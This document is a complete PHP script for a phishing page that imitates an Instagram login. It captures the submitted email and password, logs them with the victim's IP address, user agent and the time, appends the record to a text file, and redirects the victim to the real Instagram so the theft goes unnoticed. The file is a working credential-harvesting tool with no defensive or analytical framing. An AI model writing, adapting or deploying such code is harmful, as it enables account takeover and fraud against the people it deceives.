<?php
// File to store captured credentials
$file = 'credentials.txt';

// Get submitted data
$email = $_POST['email'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';

// Get additional info
$ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
$timestamp = date('Y-m-d H:i:s');

// Format the log entry
$entry = "==============================\n";
$entry .= "Time: $timestamp\n";
$entry .= "IP: $ip\n";
$entry .= "User-Agent: $user_agent\n";
$entry .= "Email/Username: $email\n";
$entry .= "Password: $password\n";
$entry .= "==============================\n\n";

// Append to file
file_put_contents($file, $entry, FILE_APPEND | LOCK_EX);

// Redirect to real Instagram so the user doesn't suspect
header('Location: https://www.instagram.com');
exit;
?>
